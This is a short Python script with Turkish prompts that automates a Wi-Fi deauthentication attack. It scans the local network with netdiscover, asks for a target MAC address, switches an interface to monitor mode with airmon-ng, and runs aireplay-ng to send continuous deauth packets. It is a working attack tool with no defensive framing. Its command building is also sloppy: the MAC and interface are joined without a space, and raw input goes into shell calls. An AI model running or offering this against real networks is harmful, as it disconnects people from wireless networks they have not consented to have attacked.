# -*- coding: utf-8 -*-
import sys
import os
import subprocess


try:
    subprocess.call("netdiscover", shell=True)
except KeyboardInterrupt:
 mac = input("DEAUTH EDILECKE MAC ADRESI : ")
 subprocess.call("ifconfig", shell=True)
 wlan = input("WLAN ISMI : ")
 subprocess.call("airmon-ng start "+wlan, shell=True)
 mon = input("MONITOR: ")
 subprocess.call("aireplay-ng 0 0 -a "+mac +mon, shell=True)


# key = 1
# while key == 1:
#  ip =  input("IP GIRIN (Çıkış Icin :q) : ")
#  if ip == "q":
#   print("Çıkılıyor...")
#   key = 0

